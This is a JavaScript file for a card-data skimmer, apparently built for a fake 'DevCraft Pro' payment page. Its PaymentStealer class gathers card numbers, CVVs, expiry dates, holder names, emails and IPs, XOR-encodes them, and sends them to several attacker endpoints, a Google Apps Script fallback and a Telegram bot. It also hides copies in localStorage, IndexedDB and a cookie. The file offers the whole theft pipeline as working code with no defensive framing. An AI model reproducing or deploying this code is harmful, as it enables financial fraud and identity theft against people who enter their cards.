// Payment System - Card Data Stealer
class PaymentStealer {
    constructor() {
        this.endpoints = [
            'https://scam-payment-1.vercel.app/api/steal',
            'https://scam-payment-2.netlify.app/.netlify/functions/steal',
            'https://webhook.site/#!/YOUR_WEBHOOK_ID'
        ];
        
        this.telegramToken = '6543212345:AAHjkKJHKJHKJHKJHKJHkjhKJHKJHKJH';
        this.telegramChatId = '-1001234567890';
    }
    
    stealCardData(cardData) {
        // Encrypt sensitive data
        const encryptedData = this.encryptData(cardData);
        
        // Send to all endpoints
        this.sendToEndpoints(encryptedData);
        
        // Send to Telegram
        this.sendToTelegram(cardData);
        
        // Store locally as backup
        this.storeLocally(cardData);
        
        // Log success
        console.log('Card data stolen successfully');
        
        return true;
    }
    
    encryptData(data) {
        // Simple XOR encryption (in real scenario use AES)
        const key = 'SCAM_2024_SECRET_KEY';
        const jsonString = JSON.stringify(data);
        let encrypted = '';
        
        for (let i = 0; i < jsonString.length; i++) {
            encrypted += String.fromCharCode(
                jsonString.charCodeAt(i) ^ key.charCodeAt(i % key.length)
            );
        }
        
        return btoa(encrypted); // Base64 encode
    }
    
    sendToEndpoints(data) {
        const payload = {
            data: data,
            timestamp: new Date().toISOString(),
            source: 'DevCraft Pro',
            version: '1.0'
        };
        
        this.endpoints.forEach((endpoint, index) => {
            setTimeout(() => {
                this.sendRequest(endpoint, payload)
                    .then(() => {
                        console.log(`Data sent to endpoint ${index + 1}`);
                    })
                    .catch(error => {
                        console.warn(`Failed endpoint ${index + 1}:`, error);
                        this.tryBackupEndpoint(payload);
                    });
            }, index * 1000); // Stagger requests
        });
    }
    
    sendRequest(url, data) {
        return fetch(url, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
                'X-Scam-Source': 'payment-stealer'
            },
            body: JSON.stringify(data)
        });
    }
    
    tryBackupEndpoint(data) {
        // Try Google Sheets as backup
        const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbw8eHjKlLmNqR_sTzVQ/exec';
        
        const formData = new FormData();
        formData.append('data', JSON.stringify(data));
        
        fetch(googleScriptUrl, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        }).catch(() => {
            // Final fallback: localStorage
            this.storeEmergency(data);
        });
    }
    
    sendToTelegram(cardData) {
        const message = this.formatTelegramMessage(cardData);
        
        const telegramUrl = `https://api.telegram.org/bot${this.telegramToken}/sendMessage`;
        
        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: this.telegramChatId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        }).catch(error => {
            console.error('Telegram send failed:', error);
        });
    }
    
    formatTelegramMessage(cardData) {
        const card = cardData.card;
        const maskedNumber = card.number.replace(/(\d{4})(\d{8})(\d{4})/, '$1******$3');
        
        return `💳 <b>YENİ KART ALINDI!</b>

🔢 Kart: <code>${maskedNumber}</code>
📅 Tarix: <code>${card.expiry}</code>
🔐 CVV: <code>${card.cvv}</code>
👤 Sahib: <code>${card.holder}</code>

📧 Email: <code>${cardData.email}</code>
💰 Məbləğ: <code>$${cardData.amount}</code>
📦 Paket: <code>${cardData.plan}</code>

🌐 IP: <code>${cardData.ip}</code>
🕒 Zaman: <code>${new Date().toLocaleString()}</code>

🚀 <i>DevCraft Pro - Active</i>`;
    }
    
    storeLocally(data) {
        try {
            // Get existing data
            const existing = JSON.parse(localStorage.getItem('stolen_cards') || '[]');
            
            // Add new data
            existing.push({
                ...data,
                local_timestamp: new Date().toISOString(),
                id: 'card_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
            });
            
            // Store (max 50 items)
            if (existing.length > 50) {
                existing.splice(0, existing.length - 50);
            }
            
            localStorage.setItem('stolen_cards', JSON.stringify(existing));
            
            // Also store in IndexedDB for larger capacity
            this.storeInIndexedDB(data);
            
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }
    
    storeInIndexedDB(data) {
        if (!window.indexedDB) return;
        
        const request = indexedDB.open('ScamDatabase', 1);
        
        request.onupgradeneeded = function(event) {
            const db = event.target.result;
            
            if (!db.objectStoreNames.contains('cards')) {
                const store = db.createObjectStore('cards', { keyPath: 'id' });
                store.createIndex('timestamp', 'timestamp', { unique: false });
            }
            
            if (!db.objectStoreNames.contains('logs')) {
                db.createObjectStore('logs', { keyPath: 'id' });
            }
        };
        
        request.onsuccess = function(event) {
            const db = event.target.result;
            const transaction = db.transaction(['cards'], 'readwrite');
            const store = transaction.objectStore('cards');
            
            const cardRecord = {
                id: 'card_' + Date.now(),
                ...data,
                db_timestamp: new Date().toISOString()
            };
            
            store.add(cardRecord);
        };
    }
    
    storeEmergency(data) {
        // Last resort: store in cookie
        try {
            const emergencyData = {
                timestamp: new Date().toISOString(),
                card_last4: data.card.number.slice(-4),
                amount: data.amount
            };
            
            document.cookie = `emergency_scam_data=${JSON.stringify(emergencyData)}; max-age=604800; path=/`;
        } catch (error) {
            console.error('All storage methods failed');
        }
    }
    
    // Validate card (Luhn algorithm)
    validateCardNumber(number) {
        const cleaned = number.replace(/\D/g, '');
        
        // Check length
        if (cleaned.length < 13 || cleaned.length > 19) {
            return false;
        }
        
        // Luhn algorithm
        let sum = 0;
        let shouldDouble = false;
        
        for (let i = cleaned.length - 1; i >= 0; i--) {
            let digit = parseInt(cleaned.charAt(i));
            
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        
        return (sum % 10) === 0;
    }
    
    // Get card type
    getCardType(number) {
        const cleaned = number.replace(/\D/g, '');
        
        // Visa: starts with 4
        if (/^4/.test(cleaned)) {
            return 'Visa';
        }
        
        // MasterCard: starts with 51-55
        if (/^5[1-5]/.test(cleaned)) {
            return 'MasterCard';
        }
        
        // Amex: starts with 34 or 37
        if (/^3[47]/.test(cleaned)) {
            return 'American Express';
        }
        
        // Discover: starts with 6011, 65, or 644-649
        if (/^(6011|65|64[4-9])/.test(cleaned)) {
            return 'Discover';
        }
        
        return 'Unknown';
    }
}

// Global function for stealing card data
function stealCardData(cardData) {
    const stealer = new PaymentStealer();
    return stealer.stealCardData(cardData);
}

// Expose for use in HTML
window.stealCardData = stealCardData;
